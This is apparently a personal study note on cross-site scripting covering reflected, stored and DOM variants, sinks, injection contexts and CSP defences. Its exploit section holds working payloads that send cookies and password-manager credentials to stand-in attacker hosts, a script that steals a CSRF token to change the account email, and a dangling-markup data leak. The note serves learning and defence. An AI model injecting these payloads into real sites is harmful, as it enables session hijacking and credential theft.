# Cross-site scripting (XSS) :scissors:

Allows an attacker to masquerade as a victim user and perform actions on their behalf.  Works by injecting malicious scripts into a website that execute in the victim's browser.

To test for XSS, inject the JavaScript `alert()` or `print()` function to see if they execute.  If yes, then XSS is possible.

:warning: Note that `print()` is now preferable as some browsers are disabling `alert()`.

## Reflected XSS

Malicious script comes from the current HTTP request:
```html
<!-- link: https://insecure-website.com/status?message=<script>print()</script> -->
<p>Status: <script>print()</script></p>
```

If the user follows the above URL, the script will execute in their browser.

### Impact

- Perform any action on behalf of the victim with their current session
- View and modify any data the victim can view/modify
- Initiate attacks on other users that will appear to come from the victim

### Limitations

The malicious URL must be delivered to the victim, and executed by them in a context where it can cause damage (e.g. in an authenticated session).

Delivery can be via infected links on other sites, email, text, social media, etc.

## Stored XSS

Persistent or second-order XSS.  Caused by a malicious script being stored and executed by the victim in the future.  An example is a malicious comment on a blog post.

Safe comment:

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

Malicious comment:

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E&name=Carlos+Montoya&email=carlos%40normal-user.net
```

### Impact

- Same impacts as reflected XSS with added benefits of:
   - Attacker does not need to find an external method to have the user visit a malicious URL.  They wait for the user to visit the vulnerable site.
   - User will likely be logged in when the malicious script executes.

## DOM-based XSS

Similar to reflected XSS, but the malicious script is injected into the DOM and executed in a sink that runs JavaScript.

Common sinks include:

```javascript
eval()
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

jQuery sinks:

```javascript
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

Examples of injections:

```javascript
document.write('... <script>alert(document.cookies)</script> ...');
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

### Impact

- Same as reflected XSS
- Can also be triggered as stored XSS depending on how the stored attack is injected into the DOM.

## Exploit

### Stealing cookies

Steal the user's site cookies, inject them into a new browser session and perform actions on their behalf.

```javascript
// Inject into a link the user will click
<script>
fetch('https://attacker-comain.com', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
});
</script>
```

#### Limitations:

- User must have an active session
- Application may have blocked JavasScript cookie access with `HttpOnly` flag.
- User session may have additional protections (CSRF, MFA, IP based restrictions).
- User session may time out before it can be hijacked.

### Capturing passwords from password managers

If a password manager is installed, the password field will be pre-filled with the user's password.  This can then be sent back to the attacker.

```html
<!-- Create a a content post (e.g. comment on a blog).
     The password manager will auto-fill these when the page loads. -->
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://attacker-domain.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

#### Limitations:

- User must have a password manager installed.
- If MFA is enabled on the user's account, the attack becomes more difficult.

### Use XSS to perform CSRF

Perform actions on behalf of a user, such as changing their account email and then triggereing a password reset to gain access.

```html
<!-- Create a a content post (e.g. comment on a blog).
     Trigger a change email request when the page loads. -->
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=attacker@naughty.com')
};
</script>
```

## Test

1. Submit a short alphanumeric payload into every entry point of the site.
1. Identify where ethat input is returned in the HTTP response.
1. Test if the return context is vulnerably to XSS (any context that executes JavaScript).

### XSS contexts

Locations where an HTTP response can execute JavaScript:

### Raw HTML

Response is dumped directly into the DOM:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
### HTML attributes

Response is injected into an HTML attribute.  This can be caused by terminating an existing element or adding a new attribute:

```html
"><script>alert(document.domain)</script>
" autofocus onfocus=alert(document.domain) x="
<a href="javascript:alert(document.domain)">
```

### JavaScript sinks

Terminating an existing `<script>` element or breaking out of a string:

```html
<script>
var foo = "user controlled data";
</script>

<!-- Malicious values:
</script><img src=1 onerror=alert(document.domain)>
;alert(document.domain)//
-->
```

String template literal injection:

```html
<script>
...
var input = `controllable data here`;
...
</script>

<!-- Include the injection as a template literal:
${alert(document.domain)}
-->
```

## Content Security Policy (CSP) to prevent XSS

Can prevent XSS through the use of a `Content-Security-Policy` header that prevents execution of JavaScript and resource loading.

```sh
# Only allow script execution from same origin as the page
script-src 'self'

# Script execution from given domain to allow 3rd party scripts
script-src https://scripts.normal-website.com
```

A nounce or hash of the script contents can also be specified by the CSP to only load `<script>` elements that have a matching nounce or that the script contents match the given hash.

The same policies exist for image tags:

```sh
# Only allow image load from same origin as the page
img-src 'self'

# Image load from given domain
img-src https://scripts.normal-website.com
```

CSPs can block clickjacking as well with their frame policies:

```sh
# Only allow frames from same origin as the page
frame-ancestors 'self'

# Do not allow frames
frame-ancestors 'none'

# Frames for given origin and trusted sites
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```

:warning: Caution must be taken if user controllable input is used to generate the CSP policy (e.g. the `report-uri`).  If possible, it allows for policy overwrite.

## Dangling markup XSS

Terminating markup to inject malicious scripts:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE">
```

If the controllable data is not escaped, the input can be terminated and all subsequent content forwarded as a GET request to an attacker website.  

```html
"><img src='//attacker-website.com?
```

This technique is used to steal CSRF tokens and other sensitive data.

## Prevent

- Filter all input as strictly as possible.
- Encode data when output to prevent it being interpreted as HTML.
- Use reponse headers to prevent XSS with `Content-Type` and `X-Content-Type-Options` if the response is not HTML.
- Use a Content Security Policy (CSP) to prevent the execution of malicious scripts.
- Do not output untrusted input into JavaScript sinks.

## Tools

- [DOM invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [Burp collaborator (pro)](https://portswigger.net/burp/documentation/collaborator)
- [Burp web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)

## References

- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/research/alert-is-dead-long-live-print
